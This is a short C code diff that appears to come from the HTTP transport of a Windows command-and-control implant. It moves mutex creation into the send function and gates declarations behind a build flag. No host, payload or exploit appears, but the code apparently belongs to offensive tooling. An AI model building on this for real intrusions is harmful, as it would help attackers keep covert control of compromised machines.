@@ -9,6 +9,9 @@
 #include "Strategy.h"
 #include "Sleep.h"
 
+
+#ifdef HTTPX_TRANSPORT
+
 #define GET_REQUEST     0x00
 #define POST_REQUEST    0x01
 int gFailureCount = 0;
@@ -16,19 +19,7 @@ HANDLE gHttpMutex = NULL;
 
 BOOL NetworkHttpXSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen);
 
-
-/**
- * @brief Initialize a mutex for preventing a race condition with global HINTERNET handles.
- * @return VOID
- */
-VOID NetworkInitMutex()
-{
-    gHttpMutex = CreateMutex(NULL, FALSE, NULL);
-    if (!gHttpMutex)
-    {
-        _err("Failed to create HTTP mutex");
-    }
-}
+#endif  // HTTPX_TRANSPORT
 
 
 /**
@@ -95,11 +86,15 @@ BOOL NetworkHttpXSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
         with multi-threading there is a possibilty of gInternetConnect/gInternetOpen 
         handles being freed while they're being used in another thread.
     */
+    if ( gHttpMutex == NULL ) {
+        gHttpMutex = CreateMutex(NULL, FALSE, NULL);
+    }
+
     if ( WaitForSingleObject(gHttpMutex, INFINITE) != WAIT_OBJECT_0 )     // Locks 
     {
         _dbg("WaitForSingleObject failed : ERROR %d", GetLastError());
     }
-        
+
 
     SIZE_T bufferLen = package->length;
     BYTE reqProfile = (bufferLen > 500) ? POST_REQUEST : GET_REQUEST;   // Choose request type based on payload size
